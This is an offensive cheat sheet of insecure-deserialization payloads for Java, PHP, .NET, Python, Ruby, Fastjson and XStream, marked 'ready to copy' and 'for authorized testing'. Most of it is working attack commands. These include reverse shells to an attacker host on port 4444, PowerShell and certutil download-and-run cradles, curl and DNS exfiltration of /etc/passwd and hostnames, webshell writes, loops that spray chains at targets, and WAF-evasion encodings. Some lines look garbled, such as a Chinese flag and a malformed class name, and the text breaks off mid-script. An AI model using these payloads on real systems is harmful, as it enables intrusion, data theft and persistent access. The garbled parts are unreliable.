# Web Deserialization Payloads

> This file is a companion to `SKILL.md`, organizing common payloads for insecure deserialization testing by language and exploitation technique.
> Purpose: Quickly find payloads for specific deserialization scenarios, ready to copy for testing.
> All payloads are for authorized security testing only.

---

## Index

1. [Java Deserialization (ysoserial)](#1-java-deserialization-ysoserial)
2. [PHP Deserialization (phpggc)](#2-php-deserialization-phpggc)
3. [.NET Deserialization (ysoserial.net)](#3-net-deserialization-ysoserialnet)
4. [Blind Deserialization Detection](#4-blind-deserialization-detection)
5. [Jackson/Fastjson Deserialization](#5-jacksonfastjson-deserialization)
6. [Python Pickle Deserialization](#6-python-pickle-deserialization)
7. [Ruby Deserialization](#7-ruby-deserialization)
8. [Gadget Chain Analysis](#8-gadget-chain-analysis)
9. [Deserialization Bypass Techniques](#9-deserialization-bypass-techniques)

---

## 1. Java Deserialization (ysoserial)

### Listing Available Gadget Chains

```bash
# Display all available ysoserial gadget chains with descriptions
java -jar ysoserial.jar --help

# List only chain names for scripting
java -jar ysoserial.jar 2>&1 | grep -E '^\s+[A-Z]' | awk '{print $1}'
```

### CommonsCollections Exploitation

```bash
# CommonsCollections1 - uses InvokerTransformer (pre-3.2.2)
java -jar ysoserial.jar CommonsCollections1 'whoami' > payload.bin

# CommonsCollections5 - works with SecurityManager, uses InvokerTransformer
java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0

# CommonsCollections6 - uses HashSet + InvokerTransformer chain
java -jar ysoserial.jar CommonsCollections6 'cat /etc/passwd' | base64 -w0

# CommonsCollections7 - uses Hashtable + ChainedTransformer
java -jar ysoserial.jar CommonsCollections7 'curl http://attacker/exfil?c=$(whoami)' | base64 -w0
```

### Spring and Hibernate Chains

```bash
# Spring1 - uses ObjectFactoryDelegatingInvocationHandler
java -jar ysoserial.jar Spring1 'touch /tmp/spring-rce' | base64 -w0

# Spring2 - uses SerializableTypeWrapper.MethodInvokeTypeProvider
java -jar ysoserial.jar Spring2 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==}|{base64,-d}|bash' | base64 -w0

# Hibernate1 - uses ComponentType.getPropertyValue()
java -jar ysoserial.jar Hibernate1 'whoami' | base64 -w0

# Hibernate2 - uses TypedPropertyValue
java -jar ysoserial.jar Hibernate2 'id' > hib_payload.bin
```

### Additional Library-Specific Chains

```bash
# BeanShell1 - uses bsh.Interpreter
java -jar ysoserial.jar BeanShell1 'id' | base64 -w0

# C3P0 - uses com.mchange.v2.c3p0.JndiRefForwardingDataSource
java -jar ysoserial.jar C3P0 'ldap://attacker:1389/Exploit' | base64 -w0

# JBossInterceptors1 - JBoss/WildFly specific
java -jar ysoserial.jar JBossInterceptors1 'whoami' | base64 -w0

# Wicket1 - Apache Wicket framework
java -jar ysoserial.jar Wicket1 'id' | base64 -w0
```

### File-Based Payload Delivery

```bash
# Write payload to file for multipart upload
java -jar ysoserial.jar CommonsCollections5 'wget http://attacker/shell -O /tmp/shell' > /tmp/upload_payload.bin
```

```bash
# Generate payload with specific encoding for cookie injection
java -jar ysoserial.jar CommonsCollections6 'id' | gzip | base64 -w0
```

```bash
# Generate URL-safe Base64 for GET parameters
java -jar ysoserial.jar CommonsCollections5 'nslookup attacker.com' | base64 -w0 | tr '+/' '-_'
```

```bash
# Double-URL-encode for Tomcat and other servers
java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0 | python3 -c "
import sys, urllib.parse
print(urllib.parse.quote(urllib.parse.quote(sys.stdin.read().strip()), safe=''))
"
```

### WebLogic and JBoss Targeting

```bash
# WebLogic T3 protocol deserialization
java -jar ysoserial.jar CommonsCollections5 'id' | python3 -c "
import sys, base64, socket
payload = sys.stdin.buffer.read()
# Wrap in T3 protocol header for WebLogic RMI
t3_header = b't3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://target:7001\n\n'
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('target', 7001))
sock.send(t3_header)
print('T3 payload sent')
"

# JBoss JMXInvokerServlet deserialization
curl -X POST http://target:8080/invoker/JMXInvokerServlet \
  -H 'Content-Type: application/x-java-serialized-object' \
  --data-binary @<(java -jar ysoserial.jar CommonsCollections5 'id')
```

### IBM WebSphere Targeting

```bash
# WebSphere SOAP connector deserialization
java -jar ysoserial.jar CommonsCollections6 'nslookup was.attacker.com' | base64 -w0

# WebSphere admin console serialization
curl -X POST http://target:9043/ibm/console/ \
  -H 'Content-Type: application/x-java-serialized-object' \
  --data-binary @<(java -jar ysoserial.jar Jdk7u21 'id')
```

### JRMP Listener for Chained Exploitation

```bash
# Start JRMP listener serving payload to any connecting client
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 'id'

# Use marshalsec to start JNDI/LDAP redirector
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker:8000 1389

# Use marshalsec for RMI registry exploitation
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http://attacker:8000 1099

# Combine JRMP client payload with listener for firewall traversal
java -jar ysoserial.jar JRMPClient 'attacker:1099' | base64 -w0
# On attacker machine:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 'reverse_shell_command'
```

### Custom Command Encoding

```bash
# Bash pipe reverse shell with ysoserial
java -jar ysoserial.jar CommonsCollections5 'bash -i >& /dev/tcp/attacker/4444 0>&1' | base64 -w0

# PowerShell download cradle for Windows targets
java -jar ysoserial.jar CommonsCollections6 'powershell IEX(New-Object Net.WebClient).DownloadString("http://attacker/ps.ps1")' | base64 -w0

# Python reverse shell via Runtime.exec()
java -jar ysoserial.jar CommonsCollections5 'python -c "import socket,subprocess,os;s=socket.socket();s.connect((\"attacker\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"' | base64 -w0

# Use BashFXMLServer for complex payloads requiring arguments
java -jar ysoserial.jar CommonsCollections5 'bash -c "bash${IFS}-i${IFS}>&${IFS}/dev/tcp/attacker/4444${IFS}0>&1"' | base64 -w0
```

---

## 2. PHP Deserialization (phpggc)

### Chain Discovery and Listing

```bash
# List all available PHP gadget chains grouped by framework
phpggc -l

# List chains for a specific framework
phpggc -l | grep -i laravel
phpggc -l | grep -i wordpress
phpggc -l | grep -i magento

# Show chain details and requirements
phpggc --详细信息 Laravel/RCE1
```

### Laravel Exploitation

```bash
# Laravel RCE1 - Monolog/RCE1 chain
phpggc Laravel/RCE1 'system("id")'

# Laravel RCE2 - different gadget path
phpggc Laravel/RCE2 'system("cat /etc/passwd")'

# Laravel RCE3 - via Ignition middleware
phpggc Laravel/RCE3 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"'

# Laravel RCE4 - via PendingCommand
phpggc Laravel/RCE4 'id' --base64

# Laravel RCE5 - via ReturnCallback
phpggc -b Laravel/RCE5 'wget http://attacker/$(whoami)'

# File write via Laravel chain
phpggc Laravel/RCE1 'file_put_contents("/var/www/shell.php","<?php system(\$_GET[0]); ?>")'
```

### WordPress and WooCommerce Chains

```bash
# WordPress Generic RCE
phpggc WordPress/Generic 'system("id")'

# WooCommerce order meta injection
phpggc WooCommerce/RCE1 'system("cat /wp-config.php")'

# WordPress file write chain
phpggc WordPress/Generic 'file_put_contents("/var/www/html/wp-content/uploads/shell.php","<?php eval(\$_POST[0]); ?>")'
```

### Magento Exploitation

```bash
# Magento RCE via Magento_Smarty chain
phpggc Magento/RCE1 'id'

# Magento2 RCE
phpggc Magento2/RCE1 'system("cat /app/etc/env.php")'

# URL-encoded output for POST parameter injection
phpggc -u Magento/RCE1 'curl http://attacker/$(whoami)'

# Magento file write for webshell deployment
phpggc Magento/RCE2 'file_put_contents("/var/www/html/pub/media/s.php","<?php system(\$_GET[c]);")'
```

### Slim Framework and Laminas Chains

```bash
# Slim framework chain
phpggc Slim/RCE1 'system("id")'
phpggc Slim/RCE2 'whoami'

# Laminas (successor to Zend Framework)
phpggc Laminas/RCE1 'cat /etc/passwd'
```

### Additional PHP Framework Chains

```bash
# Guzzle chain (common dependency)
phpggc Guzzle/RCE1 'system("whoami")'
phpggc Guzzle/RCE2 'id'
```

```bash
# Monolog chain (very common logging library)
phpggc Monolog/RCE1 'system("cat /etc/passwd")'
phpggc Monolog/RCE2 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"'
```

```bash
# Symfony chains
phpggc Symfony/RCE1 'system("id")'
phpggc Symfony/RCE2 'id'
phpggc Symfony/RCE3 'curl http://attacker/$(hostname)'
```

```bash
# Doctrine chain
phpggc Doctrine/RCE1 'system("whoami")'
```

```bash
# ZendFramework chain
phpggc ZendFramework/RCE1 'id'
```

### Encoding and Wrappers

```bash
# Base64 wrapper for binary-safe transport
phpggc -b Laravel/RCE1 'system("id")'
```

```bash
# URL-encoding for GET parameters
phpggc -u Laravel/RCE1 'system("id")'
```

```bash
# Combined base64 + URL-encoding
phpggc -b -u Magento/RCE1 'cat /etc/passwd'
```

```bash
# Phar wrapper for file-based deserialization trigger
phpggc -p phar Laravel/RCE1 'system("id")' -o exploit.phar
```

```bash
# Generate ZIP-based phar for upload bypass
phpggc -p zip Laravel/RCE1 'system("id")' -o exploit.zip
```

### PHP Deserialization via file_get_contents Triggers

```bash
# Trigger phar deserialization via image processing
# When target uses getimagesize(), imagecreatefrompng() etc.
convert exploit.phar exploit.png
# Upload the PNG with embedded phar metadata
# Target calls: getimagesize("phar://exploit.png")

# Trigger via exif_read_metadata
phpggc -p phar Laravel/RCE1 'system("id")' -o exif_payload.jpg

# PHP filter chain to trigger deserialization without phar
# Use php://filter wrapper to reach unserialize
curl "http://target/page?file=php://filter/convert.base64-encode/resource=/path/to/serialized/data"
```

---

## 3. .NET Deserialization (ysoserial.net)

### ViewState Exploitation

```bash
# Generate ViewState payload with known machineKey
ysoserial.net -g ObjectDataProvider -f LosFormatter -c "cmd /c whoami" --base64 --machinekey "validationKey,decryptionKey" --path="/default.aspx" --target=ViewState

# ViewState with custom validation algorithm
ysoserial.net -g TypeConfuseDelegate -f LosFormatter -c "cmd /c whoami" --base64 --machinekey "AA...hex...,BB...hex..." --validation SHA1 --decryption AES

# ViewState without MAC (legacy ASP.NET)
ysoserial.net -g ObjectDataProvider -f LosFormatter -c "cmd /c echo pwned > C:\pwned.txt" --base64

# Target specific .NET Framework version
ysoserial.net -g ActivitySurrogateSelector -f BinaryFormatter -c "cmd /c calc.exe" --base64 --target=ViewState --islegacy --isdebug
```

### BinaryFormatter Exploits

```bash
# ObjectDataProvider gadget with BinaryFormatter
ysoserial.net -g ObjectDataProvider -f BinaryFormatter -c "cmd /c whoami" --base64

# TypeConfuseDelegate gadget
ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami" --base64

# TextFormattingRunProperties gadget (works in Visual Studio extensions)
ysoserial.net -g TextFormattingRunProperties -f BinaryFormatter -c "cmd /c powershell IEX(New-Object Net.WebClient).DownloadString('http://attacker/ps.ps1')" --base64

# ActivitySurrogateSelector gadget
ysoserial.net -g ActivitySurrogateSelector -f BinaryFormatter -c "cmd /c calc.exe" --base64

# WindowsIdentity gadget (requires System.IdentityModel)
ysoserial.net -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami" --base64
```

### LosFormatter and ObjectStateFormatter

```bash
# LosFormatter output for ASP.NET ViewState
ysoserial.net -g ObjectDataProvider -f LosFormatter -c "cmd /c whoami" --base64

# ObjectStateFormatter for hidden field __VIEWSTATE
ysoserial.net -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c echo pwned" --base64

# NetDataContractSerializer (WCF)
ysoserial.net -g ObjectDataProvider -f NetDataContractSerializer -c "cmd /c whoami" --base64

# DataContractSerializer (requires known types)
ysoserial.net -g WindowsIdentity -f DataContractSerializer -c "cmd /c whoami" --base64
```

### PowerShell Reverse Shell Payloads

```bash
# Download cradle via ysoserial.net
ysoserial.net -g ObjectDataProvider -f LosFormatter -c "powershell -enc BASE64_ENCODED_PS_COMMAND" --base64

# Reverse shell with encoded command
# Step 1: Generate PS reverse shell
ps_command='$c=New-Object System.Net.Sockets.TcpClient("attacker",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)};$c.Close()'
# Step 2: Base64 encode
echo -n $ps_command | iconv -t UTF-16LE | base64 -w0
# Step 3: Generate payload
ysoserial.net -g TypeConfuseDelegate -f LosFormatter -c "powershell -enc BASE64_STRING" --base64

# Command staging via certutil
ysoserial.net -g ObjectDataProvider -f BinaryFormatter -c "cmd /c certutil -urlcache -split -f http://attacker/payload.exe C:\\temp\\p.exe && C:\\temp\\p.exe" --base64
```

---

## 4. Blind Deserialization Detection

### DNS-Based Detection

```bash
# GadgetProbe DNS enumeration
java -cp gadgetprobe.jar GadgetProbe --dns-callback attacker.burpcollaborator.net --input suspect_data.bin

# ysoserial with nslookup for DNS callback
java -jar ysoserial.jar CommonsCollections5 'nslookup attacker.com' | base64 -w0

# Use dig for more reliable DNS resolution
java -jar ysoserial.jar CommonsCollections6 'dig $(whoami).attacker.com' | base64 -w0

# DNS exfiltration of hostname
java -jar ysoserial.jar CommonsCollections5 'nslookup $(hostname).attacker.com' | base64 -w0

# Multi-stage DNS detection with different chains
for chain in CommonsCollections1 CommonsCollections5 CommonsCollections6 CommonsCollections7; do
  java -jar ysoserial.jar $chain "nslookup ${chain}.attacker.com" | base64 -w0
  echo "Chain: $chain"
done
```

### HTTP-Based Detection

```bash
# HTTP GET callback to confirm execution
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker/rce-confirmed' | base64 -w0

# HTTP callback with unique identifier per chain
java -jar ysoserial.jar CommonsCollections6 'wget http://attacker/deser-$(date +%s)' | base64 -w0

# PHP HTTP callback
phpggc -b Laravel/RCE1 'file_get_contents("http://attacker/php-deser")'

# .NET HTTP callback
ysoserial.net -g ObjectDataProvider -f LosFormatter -c "cmd /c curl http://attacker/dotnet-deser" --base64

# Python HTTP callback via pickle
python3 -c "
import pickle, os, base64
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://attacker/pickle-deser',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
"
```

### Time-Based Detection

```bash
# 5-second delay to confirm Java deserialization
java -jar ysoserial.jar CommonsCollections5 'sleep 5' | base64 -w0

# 10-second delay for high-latency targets
java -jar ysoserial.jar CommonsCollections6 'sleep 10' | base64 -w0

# PHP sleep-based detection
phpggc -b Laravel/RCE1 'sleep(5)'

# .NET time-based detection with ping
ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c ping -n 6 127.0.0.1" --base64

# Python time-based pickle payload
python3 -c "
import pickle, time, base64
class TimeDelay:
    def __reduce__(self):
        return (time.sleep, (5,))
print(base64.b64encode(pickle.dumps(TimeDelay())).decode())
"

# Measure response time with curl
time curl -s -o /dev/null -w '%{time_total}' \
  -H 'Cookie: session=BASE64_PAYLOAD_HERE' \
  http://target/page
```

---

## 5. Jackson/Fastjson Deserialization

### Jackson Polymorphic Deserialization

```bash
# Exploit DEFAULT_TYPING enabled Jackson
# Craft JSON with @class type hint pointing to exploitable class
cat > jackson_payload.json << 'JSONEOF'
["com.sun.rowset.JdbcRowSetImpl", {
  "dataSourceName": "ldap://attacker:1389/Exploit",
  "autoCommit": true
}]
JSONEOF

# Jackson with Hibernate chain
cat > hibernate_jackson.json << 'JSONEOF'
["org.hibernate.engine.spi.TypedValue", {
  "value": "any",
  "type": {
    "class": "org.hibernate.type.ComponentType",
    "propertyTypes": [{"class": "org.hibernate.type.StringType"}],
    "propertyNames": ["a"]
  }
}]
JSONEOF

# Chained Jackson exploitation with Spring
cat > spring_jackson.json << 'JSONEOF'
["org.springframework.context.support.ClassPathXmlApplicationContext", "http://attacker/beans.xml"]
JSONEOF
```

### Fastjson Exploitation

```bash
# Fastjson 1.2.24 autotype bypass (CVE-2017-18349)
# JdbcRowSetImpl JNDI injection
curl -X POST http://target/api \
  -H 'Content-Type: application/json' \
  -d '{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"ldap://attacker:1389/Exploit",
    "autoCommit":true
  }'

# Fastjson with JNDI via RMI
curl -X POST http://target/api \
  -H 'Content-Type: application/json' \
  -d '{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"rmi://attacker:1099/Exploit",
    "autoCommit":true
  }'

# Fastjson 1.2.47 bypass via java.lang.Class cache (CVE-2019-9081)
curl -X POST http://target/api \
  -H 'Content-Type: application/json' \
  -d '{
    "a": {
      "@type": "java.lang.Class",
      "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
      "@type": "com.sun.rowset.JdbcRowSetImpl",
      "dataSourceName": "ldap://attacker:1389/Exploit",
      "autoCommit": true
    }
  }'

# Fastjson 1.2.68 bypass via expectClass
curl -X POST http://target/api \
  -H 'Content-Type: application/json' \
  -d '{
    "@type": "java.lang.AutoCloseable",
    "@type": "com.ibm.as400.access.RemoteCommandImpl",
    "host": "attacker",
    "port": 4444
  }'

# Fastjson with local class path gadget
curl -X POST http://target/api \
  -H 'Content-Type: application/json' \
  -d '{
    "@type":"java.net.Inet4Address",
    "val":"attacker.com"
  }'
```

### XStream Deserialization

```bash
# XStream ProcessBuilder RCE
curl -X POST http://target/api \
  -H 'Content-Type: application/xml' \
  -d '<java.util.ProcessBuilder>
    <command>
      <string>cmd</string><string>/c</string><string>whoami</string>
    </command>
  </java.util.ProcessBuilder>'

# XStream with EventHandler proxy
curl -X POST http://target/api \
  -H 'Content-Type: application/xml' \
  -d '<dynamic-proxy>
    <interface>java.lang.Runnable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command><string>cmd</string><string>/c</string><string>calc</string></command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>'

# XStream ImageIO trigger (CVE-2021-39154)
curl -X POST http://target/api \
  -H 'Content-Type: application/xml' \
  -d '<map>
    <entry>
      <jdk.nashorn.internal.objects.NativeString><flags>0</flags><value>test</value></jdk.nashorn.internal.objects.NativeString>
      <jdk.nashorn.internal.objects.NativeString><flags>0</flags><value>test</value></jdk.nashorn.internal.objects.NativeString>
    </entry>
  </map>'
```

---

## 6. Python Pickle Deserialization

### Basic RCE Payloads

```bash
# Simple os.system RCE via pickle
python3 -c "
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(RCE())).decode())
"

# Reverse shell via pickle
python3 -c "
import pickle, base64, os
class Shell:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/attacker/4444 0>&1',))
print(base64.b64encode(pickle.dumps(Shell())).decode())
"

# File read exfiltration
python3 -c "
import pickle, base64, os
class ReadFile:
    def __reduce__(self):
        return (os.system, ('curl http://attacker/$(cat /etc/passwd | base64)',))
print(base64.b64encode(pickle.dumps(ReadFile())).decode())
"

# Subprocess-based payload (better output handling)
python3 -c "
import pickle, base64, subprocess
class SubRCE:
    def __reduce__(self):
        return (subprocess.check_output, (['id'],))
print(base64.b64encode(pickle.dumps(SubRCE())).decode())
"
```

### Flask Session Pickle Deserialization

```bash
# Flask uses itsdangerous for sessions; older versions used pickle
# Craft malicious Flask session cookie
python3 -c "
import pickle, base64, os, zlib, hmac, hashlib, time, struct

SECRET_KEY = 'known_secret_key'  # obtained via info leak

class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://attacker/rce',))

payload = pickle.dumps(RCE(), protocol=2)
# Flask < 1.0 session format: timestamp + payload + signature
# This is a conceptual example; use flask-unsign for real exploitation
print(base64.b64encode(payload).decode())
"

# Use flask-unsign to forge session with pickle payload
pip install flask-unsign
flask-unsign --sign --cookie '{
  \"_flashes\": \"__import__(\\\"os\\\").system(\\\"id\\\")\",
  \"user_id\": 1
}' --secret 'known_secret_key'

# Bruteforce Flask secret key
flask-unsign --unsign --cookie 'session_cookie_value' --wordlist /usr/share/wordlists/rockyou.txt
```

### Django Session Deserialization

```bash
# Django signed_cookies session backend uses pickle serializer (legacy)
# Generate malicious session if SECRET_KEY is known
python3 -c "
import django.core.signing
import os

os.environ['DJANGO_SETTINGS_MODULE'] = 'settings'
SECRET_KEY = 'known_django_secret'

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

signer = django.core.signing.Signer(SECRET_KEY)
payload = django.core.signing.dumps(RCE(), key=SECRET_KEY, serializer=django.core.signing.PickleSerializer)
print(payload)
"

# Django YAML safe_load bypass via python/object/apply
python3 -c "
import yaml, base64
# PyYAML with unsafe load
payload = '''
!!python/object/apply:os.system ['id']
'''
print(base64.b64encode(payload.encode()).decode())
"

# Python yaml.load (unsafe) exploitation
python3 -c "
import base64
payload = '''!!python/object/apply:subprocess.check_output
- - curl
  - http://attacker/rce
'''
print(base64.b64encode(payload.encode()).decode())
"
```

### Advanced Python Pickle Techniques

```bash
# Pickle opcode-level custom payload (bypasses simple __reduce__ filters)
python3 -c "
import pickle, base64, io

# Build custom pickle bytecode using opcodes
class CustomPayload:
    def __reduce__(self):
        return (eval, ('__import__(\"os\").system(\"id\")',))

data = pickle.dumps(CustomPayload(), protocol=4)
print(base64.b64encode(data).decode())
"

# Pickle with exec for multi-statement payloads
python3 -c "
import pickle, base64
class ExecRCE:
    def __reduce__(self):
        code = '''
import socket,subprocess,os
s=socket.socket()
s.connect((\"attacker\",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call([\"/bin/sh\",\"-i\"])
'''
        return (exec, (code,))
print(base64.b64encode(pickle.dumps(ExecRCE())).decode())
"

# Module-level function call bypass
python3 -c "
import pickle, base64
class BypassRCE:
    def __reduce__(self):
        return (eval, (\"__import__('os').popen('id').read()\",))
print(base64.b64encode(pickle.dumps(BypassRCE())).decode())
"
```

---

## 7. Ruby Deserialization

### Ruby ERB and Gem Gadget Chains

```bash
# Ruby ERB deserialization (CVE-2022-32224 etc.)
# Generate Ruby serialized payload with Gem::RequestSet
ruby -e '
require "erb"
require "yaml"

# Craft malicious YAML for Ruby deserialization
payload = <<~YAML
---
!ruby/object:Gem::Installer
i: x
YAML
puts YAML.load(payload) rescue puts "Error expected for demo"
'

# Ruby YAML.load unsafe deserialization
ruby -e '
require "yaml"

payload = <<~YAML
---
!ruby/object:Gem::Requirement
requirements:
  - !ruby/object:Gem::Dependency
    name: !ruby/object:ERB
      src: "system(\"id\")"
YAML
# Unsafe load would trigger ERB rendering
puts "Payload generated"
'

# Ruby Marshal.dump/load exploitation
ruby -e '
require "base64"

# Conceptual Marshal payload structure
# Real exploitation requires specific gadget chains
class Evil
  def initialize
    @cmd = "id"
  end
end
payload = Marshal.dump(Evil.new)
puts Base64.strict_encode64(payload)
'
```

### Rails Deserialization

```bash
# Rails cookie deserialization with known secret_key_base
# Generate signed Rails cookie with embedded Marshal payload
ruby -e '
require "base64"
require "openssl"

secret_key_base = "known_secret_key_base"
# Rails derives secret from secret_key_base
key_iter = OpenSSL::PKCS5.pbkdf2_hmac_sha1(secret_key_base, "authenticated encrypted cookie", 1000, 32)
puts "Derived key (hex): #{key_iter.unpack1("H*")}"

# The cookie value is Marshal serialized -> encrypted -> Base64
# Use rails-cookie-decryptor tool for full exploitation
puts "Use: git clone https://github.com/AdrianCX/rails-cookie-decryptor"
'

# Rails message verifier exploitation
ruby -e '
require "active_support/message_verifier"
require "base64"

secret = "known_secret_key_base"
verifier = ActiveSupport::MessageVerifier.new(secret)

# Craft Marshal payload
class RCE
  def marshal_dump
    "system(\"id\")"
  end
end

# Concept: verifier.generate(RCE.new) would create signed cookie
puts "In production use: ruby/rails-rce-tool for chain generation"
'

# Devise remember_token exploitation
ruby -e '
require "base64"
# Devise uses Marshal for remember_token in older versions
# If secret_key_base is leaked, forge remember_token cookie
puts "Generate payload with known secret_key_base"
puts "Use tool: https://github.com/p4p1/rails_json_session_cookie"
'
```

---

## 8. Gadget Chain Analysis

### Classpath Enumeration with GadgetProbe

```bash
# Basic GadgetProbe DNS enumeration
java -cp gadgetprobe.jar GadgetProbe \
  --dns-callback attacker.burpcollaborator.net \
  --input base64_serialized_data_here

# Enumerate specific classes for chain feasibility
java -cp gadgetprobe.jar GadgetProbe \
  --dns-callback attacker.burpcollaborator.net \
  --wordlist /usr/share/wordlists/java-classes.txt \
  --input suspect_data.bin

# Custom class list for targeted enumeration
cat > target_classes.txt << 'EOF'
org.apache.commons.collections.Transformer
org.apache.commons.collections.functors.InvokerTransformer
org.apache.commons.collections.functors.ChainedTransformer
org.apache.commons.collections.keyvalue.TiedMapEntry
org.apache.commons.collections.map.LazyMap
org.apache.xalan.xsltc.trax.TemplatesImpl
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
org.springframework.beans.factory.ObjectFactory
org.hibernate.type.ComponentType
EOF

java -cp gadgetprobe.jar GadgetProbe \
  --dns-callback attacker.burpcollaborator.net \
  --wordlist target_classes.txt \
  --input base64_payload
```

### Manual Gadget Chain Discovery

```bash
# Decompile target JAR to identify available classes
jar tf target-application.jar | grep -i transformer
jar tf target-application.jar | grep -i collections

# Use cfr decompiler to analyze gadget candidates
java -jar cfr.jar target-application.jar --outputdir decompiled/
grep -r "InvokerTransformer\|ChainedTransformer\|Runtime.exec" decompiled/

# Map library versions from MANIFEST.MF
unzip -p target-application.jar META-INF/MANIFEST.MF
unzip -p target-application.jar META-INF/maven/*/pom.properties

# Identify Commons Collections version for chain selection
jar tf target-application.jar | grep "commons-collections"
# Version 3.1-3.2.1: CommonsCollections1-7
# Version 4.0: CommonsCollections2,4 (different package path)
```

### Marshalsec Research Tools

```bash
# Start marshalsec LDAP reference server
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \
  http://attacker:8000 1389

# Start marshalsec RMI reference server
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer \
  http://attacker:8000 1099

# Start marshalsec JRMP server
java -cp marshalsec.jar marshalsec.jndi.JRMPListener 1099

# Generate marshalsec payloads for different marshallers
java -cp marshalsec.jar marshalsec.Hessian \
  curl http://attacker/marshalsec > hessian_payload.bin

java -cp marshalsec.jar marshalsec.XStream \
  curl http://attacker/marshalsec > xstream_payload.xml

java -cp marshalsec.jar marshalsecJackson \
  curl http://attacker/marshalsec > jackson_payload.json

# Serve malicious class file for JNDI exploitation
# Compile exploit class
cat > Exploit.java << 'JAVAEOF'
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("id");
        } catch (Exception e) {}
    }
}
JAVAEOF
javac Exploit.java
# Serve via HTTP on port 8000
python3 -m http.server 8000
```

### Automated Chain Testing

```bash
# Test all CommonsCollections chains against a target
for chain in CommonsCollections1 CommonsCollections2 CommonsCollections3 \
             CommonsCollections4 CommonsCollections5 CommonsCollections6 \
             CommonsCollections7; do
  payload=$(java -jar ysoserial.jar $chain "nslookup ${chain}.attacker.com" | base64 -w0)
  echo "Testing $chain..."
  curl -s -o /dev/null -w "%{http_code}" \
    -H "Cookie: JSESSIONID=invalid; data=${payload}" \
    http://target/app
  echo ""
done

# Test all ysoserial chains and log results
for chain in $(java -jar ysoserial.jar 2>&1 | grep -oP '(?<=\s)[A-Z][a-zA-Z0-9]+(?=\s)'); do
  echo "[$(date +%H:%M:%S)] Testing chain: $chain"
  payload=$(java -jar ysoserial.jar $chain "curl http://attacker/${chain}" 2>/dev/null | base64 -w0)
  if [ -n "$payload" ]; then
    curl -s -o /dev/null -w "  Status: %{http_code}, Time: %{time_total}s\n" \
      -H "X-Data: ${payload}" \
      http://target/api/endpoint
  fi
done
```

---

## 9. Deserialization Bypass Techniques

### Encoding and Compression Bypass

```bash
# Gzip-compressed Java payload to evade WAF
java -jar ysoserial.jar CommonsCollections5 'id' | gzip | base64 -w0

# Double Base64 encoding for nested decode scenarios
java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0 | base64 -w0

# Hex-encoded payload
java -jar ysoserial.jar CommonsCollections5 'id' | xxd -p | tr -d '\n'

# URL-encode critical bytes to bypass string-matching WAF
java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0 | sed 's/A/%41/g; s/E/%45/g'

# Custom Base64 alphabet variant
java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0 | tr 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/'

# Zlib deflate compression for .NET payloads
python3 -c "
import zlib, base64, sys
data = sys.stdin.buffer.read()
compressed = zlib.compress(data)
print(base64.b64encode(compressed).decode())
" < payload.bin
```

### Payload Obfuscation

```bash
# Split payload across multiple cookies
java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0 > full_payload.txt
split -b 512 full_payload.txt chunk_
# Inject as: Cookie: data1=chunk_aa; data2=chunk_ab; data3=chunk_ac

# Null byte injection in serialized stream
java -jar ysoserial.jar CommonsCollections5 'id' | \
  python3 -c "
import sys, base64
data = sys.stdin.buffer.read()
# Insert null bytes at non-critical positions
modified = data[:4] + b'\x00' + data[4:]
print(base64.b64encode(modified).decode())
"

# Modify Java serialization stream metadata
# Change TC_BLOCKDATA markers while preserving gadget chain
java -jar ysoserial.jar CommonsCollections6 'id' | \
  python3 -c "
import sys, base64, struct
data = bytearray(sys.stdin.buffer.read())
# Flip reset bits in stream to confuse simple parsers
# Position 2-3: modify stream version bytes (non-functional)
